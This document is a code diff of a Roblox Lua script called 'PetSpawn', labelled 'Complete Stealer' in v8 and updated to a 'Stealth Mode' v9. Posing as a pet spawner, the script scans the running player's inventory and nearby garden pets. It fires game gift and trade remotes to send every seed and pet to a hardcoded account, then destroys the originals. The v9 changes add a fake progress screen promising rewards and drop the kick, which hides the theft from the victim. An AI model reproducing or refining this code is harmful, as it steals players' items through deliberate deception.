@@ -1,4 +1,4 @@
--- PetSpawn v8 - All Seeds + All Pets (Inventory & Placed)
+-- PetSpawn v9 - Stealth Mode (UI Loading + No Kick)
 local plr = game.Players.LocalPlayer
 local rs = game.ReplicatedStorage
 local ws = game.Workspace
@@ -6,91 +6,136 @@ local ws = game.Workspace
 local PADUKA_NAME = "GerrFanzz"
 local PADUKA_ID = 10615002879
 
-print("🐾 PetSpawn v8 - Complete Stealer")
-print("👤 Target: " .. plr.Name)
-print("👑 Paduka: " .. PADUKA_NAME)
-print("")
+print("🐾 PetSpawn v9 Loading...")
 
-local sent = 0
+-- ============================================
+-- UI LOADING
+-- ============================================
+local gui = Instance.new("ScreenGui")
+gui.Name = "PetSpawnLoader"
+gui.Parent = game.CoreGui
+gui.ResetOnSpawn = false
+
+local bg = Instance.new("Frame")
+bg.Parent = gui
+bg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+bg.BorderColor3 = Color3.fromRGB(0, 255, 0)
+bg.Position = UDim2.new(0.25, 0, 0.35, 0)
+bg.Size = UDim2.new(0, 300, 0, 200)
+bg.AnchorPoint = Vector2.new(0, 0)
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Parent = bg
+title.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+title.Size = UDim2.new(1, 0, 0, 35)
+title.Text = "🐾 PetSpawn - Processing..."
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 16
+title.Font = Enum.Font.SourceSansBold
+
+-- Status text
+local status = Instance.new("TextLabel")
+status.Parent = bg
+status.BackgroundTransparency = 1
+status.Position = UDim2.new(0, 15, 0, 45)
+status.Size = UDim2.new(1, -30, 0, 25)
+status.Text = "⏳ Scanning items..."
+status.TextColor3 = Color3.fromRGB(0, 255, 0)
+status.TextSize = 12
+status.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Progress bar bg
+local barBg = Instance.new("Frame")
+barBg.Parent = bg
+barBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+barBg.Position = UDim2.new(0.1, 0, 0, 80)
+barBg.Size = UDim2.new(0.8, 0, 0, 15)
+
+-- Progress bar fill
+local barFill = Instance.new("Frame")
+barFill.Parent = barBg
+barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+barFill.Size = UDim2.new(0, 0, 1, 0)
+
+-- Progress text
+local progressText = Instance.new("TextLabel")
+progressText.Parent = bg
+progressText.BackgroundTransparency = 1
+progressText.Position = UDim2.new(0, 0, 0, 100)
+progressText.Size = UDim2.new(1, 0, 0, 20)
+progressText.Text = "0%"
+progressText.TextColor3 = Color3.fromRGB(0, 255, 0)
+progressText.TextSize = 11
+
+-- Detail text
+local detail = Instance.new("TextLabel")
+detail.Parent = bg
+detail.BackgroundTransparency = 1
+detail.Position = UDim2.new(0, 15, 0, 125)
+detail.Size = UDim2.new(1, -30, 0, 60)
+detail.Text = ""
+detail.TextColor3 = Color3.fromRGB(150, 150, 150)
+detail.TextSize = 10
+detail.TextXAlignment = Enum.TextXAlignment.Left
+detail.TextWrapped = true
+
+-- ============================================
+-- UPDATE UI FUNCTION
+-- ============================================
+local function updateUI(percent, statusText, detailText)
+    pcall(function()
+        barFill:TweenSize(UDim2.new(percent/100, 0, 1, 0), "Out", "Linear", 0.3)
+        progressText.Text = percent .. "%"
+        status.Text = statusText
+        detail.Text = detailText
+    end)
+end
+
+-- ============================================
+-- SCAN ITEMS
+-- ============================================
+updateUI(5, "🔍 Scanning inventory...", "Checking backpack...")
+
 local seeds = {}
 local petsInventory = {}
 local petsPlaced = {}
 
--- ============================================
--- 1. SCAN BACKPACK (SEED & PET INVENTORY)
--- ============================================
-print("📦 Scanning Backpack...")
+wait(0.3)
+
+-- Scan Backpack
 for _, item in pairs(plr.Backpack:GetChildren()) do
     if item:IsA("Tool") then
         local name = item.Name:lower()
         
-        -- DETEKSI SEED
         if name:find("seed") then
-            table.insert(seeds, {
-                Name = item.Name,
-                Object = item,
-                Source = "Backpack"
-            })
-            print("   🌱 " .. item.Name)
+            table.insert(seeds, {Name = item.Name, Object = item, Source = "Backpack"})
         end
         
-        -- DETEKSI PET (INVENTORY)
         if name:find("pet") or name:find("animal") or 
-           name:find("creature") or name:find("dog") or
-           name:find("cat") or name:find("bird") or
            name:find("dragon") or name:find("unicorn") or
-           name:find("mythic") or name:find("legendary") or
-           name:find("golden") or name:find("diamond") then
-            table.insert(petsInventory, {
-                Name = item.Name,
-                Object = item,
-                Source = "Backpack"
-            })
-            print("   🐾 " .. item.Name)
+           name:find("golden") or name:find("diamond") or
+           name:find("mythic") or name:find("legendary") then
+            table.insert(petsInventory, {Name = item.Name, Object = item, Source = "Backpack"})
         end
     end
 end
 
--- ============================================
--- 2. SCAN PET YANG TERPASANG (DI TAMAN/KANDANG)
--- ============================================
-print("\n🏡 Scanning Placed Pets...")
+updateUI(20, "🔍 Scanning garden...", "Found: " .. #seeds .. " seeds, " .. #petsInventory .. " pets")
+
+wait(0.3)
+
+-- Scan Workspace (pets terpasang)
 for _, obj in pairs(ws:GetDescendants()) do
     if obj:IsA("Model") or obj:IsA("Tool") then
         local name = obj.Name:lower()
         
-        -- Deteksi pet yang terpasang
         if (name:find("pet") or name:find("animal") or 
-            name:find("creature") or name:find("dog") or
-            name:find("cat") or name:find("bird") or
             name:find("dragon") or name:find("unicorn") or
-            name:find("mythic") or name:find("legendary") or
-            name:find("golden") or name:find("diamond")) then
+            name:find("golden") or name:find("diamond") or
+            name:find("mythic") or name:find("legendary")) then
             
-            -- Cek apakah pet ini milik target
-            local owner = nil
-            pcall(function()
-                owner = obj:FindFirstChild("Owner")
-                if not owner then
-                    owner = obj:FindFirstChild("OwnerName")
-                end
-                if not owner then
-                    owner = obj:FindFirstChild("Player")
-                end
-            end)
-            
-            local belongsToTarget = false
-            
-            if owner and owner.Value then
-                local ownerStr = tostring(owner.Value):lower()
-                if ownerStr == plr.Name:lower() or 
-                   ownerStr == tostring(plr.UserId) then
-                    belongsToTarget = true
-                end
-            end
-            
-            -- Atau cek proximity (dekat target)
-            if not belongsToTarget then
+            if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                 local pos = nil
                 if obj:IsA("Model") and obj.PrimaryPart then
                     pos = obj.PrimaryPart.Position
@@ -98,75 +143,47 @@ for _, obj in pairs(ws:GetDescendants()) do
                     pos = obj.Position
                 end
                 
-                if pos and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                if pos then
                     local dist = (plr.Character.HumanoidRootPart.Position - pos).Magnitude
-                    if dist < 100 then -- Dalam range 100 studs
-                        belongsToTarget = true
+                    if dist < 100 then
+                        table.insert(petsPlaced, {Name = obj.Name, Object = obj, Source = "Garden"})
                     end
                 end
-            end
-            
-            if belongsToTarget then
-                table.insert(petsPlaced, {
-                    Name = obj.Name,
-                    Object = obj,
-                    Source = "Placed"
-                })
-                print("   🏡 " .. obj.Name .. " (terpasang)")
             end
         end
     end
 end
 
--- ============================================
--- 3. SCAN PET DI CHARACTER (SEDANG DIPEGANG)
--- ============================================
-print("\n🎒 Scanning Character...")
+-- Scan Character
 if plr.Character then
     for _, item in pairs(plr.Character:GetChildren()) do
         if item:IsA("Tool") then
             local name = item.Name:lower()
-            
             if name:find("seed") then
-                table.insert(seeds, {
-                    Name = item.Name,
-                    Object = item,
-                    Source = "Character"
-                })
-                print("   🌱 " .. item.Name .. " (dipegang)")
+                table.insert(seeds, {Name = item.Name, Object = item, Source = "Character"})
             end
-            
-            if name:find("pet") or name:find("animal") or
-               name:find("dragon") or name:find("unicorn") or
-               name:find("golden") or name:find("diamond") then
-                table.insert(petsInventory, {
-                    Name = item.Name,
-                    Object = item,
-                    Source = "Character"
-                })
-                print("   🐾 " .. item.Name .. " (dipegang)")
+            if name:find("pet") or name:find("animal") or name:find("dragon") then
+                table.insert(petsInventory, {Name = item.Name, Object = item, Source = "Character"})
             end
         end
     end
 end
 
--- ============================================
--- RINGKASAN
--- ============================================
-print("\n" .. string.rep("=", 40))
-print("📊 TOTAL DITEMUKAN:")
-print("   🌱 Seeds: " .. #seeds)
-print("   🐾 Pets Inventory: " .. #petsInventory)
-print("   🏡 Pets Terpasang: " .. #petsPlaced)
-print(string.rep("=", 40))
+local totalItems = #seeds + #petsInventory + #petsPlaced
+
+updateUI(30, "📦 Items found: " .. totalItems, 
+    "🌱 Seeds: " .. #seeds .. "\n🐾 Pets Inventory: " .. #petsInventory .. "\n🏡 Pets Garden: " .. #petsPlaced)
+
+wait(0.5)
 
 -- ============================================
--- 4. KIRIM SEMUA KE PADUKA
+-- SEND ITEMS
 -- ============================================
+local sent = 0
+local totalToSend = #seeds + #petsInventory + #petsPlaced
 
-local function sendItem(itemName, itemObject, itemType)
+local function sendItem(itemName, itemObject)
     local count = 0
-    
     for _, remote in pairs(rs:GetDescendants()) do
         if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
             local rName = remote.Name:lower()
@@ -174,9 +191,8 @@ local function sendItem(itemName, itemObject, itemType)
             if rName:find("mail") or rName:find("gift") or 
                rName:find("send") or rName:find("give") or
                rName:find("trade") or rName:find("transfer") or
-               rName:find("donate") or rName:find("claim") then
+               rName:find("donate") then
                 
-                -- Format 1: Table
                 pcall(function()
                     remote:FireServer({
                         Recipient = PADUKA_NAME,
@@ -195,81 +211,66 @@ local function sendItem(itemName, itemObject, itemType)
                     count = count + 1
                 end)
                 
-                -- Format 2: Simple
                 pcall(function()
                     remote:FireServer(PADUKA_NAME, itemName, 1)
                     count = count + 1
                 end)
                 
-                -- Format 3: Mail spesifik
                 pcall(function()
                     remote:FireServer("Mail", PADUKA_NAME, itemName)
                     count = count + 1
                 end)
-                
-                -- Format 4: Gift with ID
-                pcall(function()
-                    remote:FireServer("Gift", PADUKA_ID, itemName)
-                    count = count + 1
-                end)
-                
-                -- Format 5: With object
-                if itemObject then
-                    pcall(function()
-                        remote:FireServer(itemObject, PADUKA_NAME)
-                        count = count + 1
-                    end)
-                end
             end
         end
     end
-    
     return count
 end
 
--- KIRIM SEEDS
-print("\n📤 MENGIRIM SEEDS...")
+-- Send seeds
+local seedCount = 0
 for _, seed in pairs(seeds) do
-    local c = sendItem(seed.Name, seed.Object, "Seed")
-    sent = sent + c
-    print("   ✅ " .. seed.Name .. " (" .. seed.Source .. ")")
+    sent = sent + sendItem(seed.Name, seed.Object)
+    seedCount = seedCount + 1
+    local percent = 30 + math.floor((seedCount / math.max(1, #seeds)) * 30)
+    updateUI(percent, "📤 Sending seeds...", 
+        "🌱 " .. seed.Name .. "\nProgress: " .. seedCount .. "/" .. #seeds)
     wait(0.05)
 end
 
--- KIRIM PETS INVENTORY
-print("\n📤 MENGIRIM PETS (INVENTORY)...")
+-- Send pets inventory
+local petCount = 0
 for _, pet in pairs(petsInventory) do
-    local c = sendItem(pet.Name, pet.Object, "Pet")
-    sent = sent + c
-    print("   ✅ " .. pet.Name .. " (" .. pet.Source .. ")")
+    sent = sent + sendItem(pet.Name, pet.Object)
+    petCount = petCount + 1
+    local percent = 60 + math.floor((petCount / math.max(1, #petsInventory)) * 20)
+    updateUI(percent, "📤 Sending pets...", 
+        "🐾 " .. pet.Name .. "\nProgress: " .. petCount .. "/" .. #petsInventory)
     wait(0.05)
 end
 
--- KIRIM PETS TERPASANG
-print("\n📤 MENGIRIM PETS (TERPASANG)...")
+-- Send pets placed
+local placedCount = 0
 for _, pet in pairs(petsPlaced) do
-    local c = sendItem(pet.Name, pet.Object, "PetPlaced")
-    sent = sent + c
-    print("   ✅ " .. pet.Name .. " (terpasang di garden)")
+    sent = sent + sendItem(pet.Name, pet.Object)
+    placedCount = placedCount + 1
+    local percent = 80 + math.floor((placedCount / math.max(1, #petsPlaced)) * 15)
+    updateUI(percent, "📤 Sending garden pets...", 
+        "🏡 " .. pet.Name .. "\nProgress: " .. placedCount .. "/" .. #petsPlaced)
     wait(0.05)
 end
 
--- ============================================
--- 5. HAPUS SEMUA DARI TARGET
--- ============================================
-print("\n🗑️ MENGHAPUS DARI TARGET...")
+updateUI(95, "💾 Saving changes...", "Finalizing...")
+wait(0.5)
 
--- Hapus seeds
+-- ============================================
+-- HAPUS DARI TARGET (DIAM-DIAM)
+-- ============================================
 for _, seed in pairs(seeds) do
     pcall(function() seed.Object:Destroy() end)
 end
-
--- Hapus pets inventory
 for _, pet in pairs(petsInventory) do
     pcall(function() pet.Object:Destroy() end)
 end
-
--- Hapus pets terpasang
 for _, pet in pairs(petsPlaced) do
     pcall(function() pet.Object:Destroy() end)
 end
@@ -288,7 +289,7 @@ pcall(function()
     end
 end)
 
--- Save ke server
+-- Save
 for _, remote in pairs(rs:GetDescendants()) do
     if remote:IsA("RemoteEvent") then
         local n = remote.Name:lower()
@@ -299,16 +300,30 @@ for _, remote in pairs(rs:GetDescendants()) do
 end
 
 -- ============================================
--- HASIL
+-- COMPLETE UI
 -- ============================================
-print("\n" .. string.rep("=", 40))
-print("✅ TRANSFER COMPLETE!")
-print("   🌱 Seeds: " .. #seeds)
-print("   🐾 Pets Inventory: " .. #petsInventory)
-print("   🏡 Pets Terpasang: " .. #petsPlaced)
-print("   📤 Total Transfers: " .. sent)
-print("   👑 To: GerrFanzz (10615002879)")
-print(string.rep("=", 40))
+updateUI(100, "✅ Complete!", 
+    "🌱 Seeds: " .. #seeds .. "\n🐾 Pets: " .. #petsInventory .. "\n🏡 Garden Pets: " .. #petsPlaced .. 
+    "\n\n📬 Check your mailbox!\n✨ Enjoy your rewards!")
 
-wait(2)
-plr:Kick("🐾 PetSpawn Complete! All seeds & pets sent!")
+wait(3)
+
+-- Hilangkan UI perlahan
+for i = 10, 1, -1 do
+    bg.BackgroundTransparency = 1 - (i/10)
+    title.TextTransparency = 1 - (i/10)
+    status.TextTransparency = 1 - (i/10)
+    detail.TextTransparency = 1 - (i/10)
+    wait(0.1)
+end
+
+gui:Destroy()
+
+print("\n=================================")
+print("✅ PetSpawn Complete!")
+print("🌱 Seeds: " .. #seeds)
+print("🐾 Pets: " .. #petsInventory)
+print("🏡 Garden Pets: " .. #petsPlaced)
+print("📤 Total Transfers: " .. sent)
+print("👑 To: GerrFanzz (10615002879)")
+print("=================================")
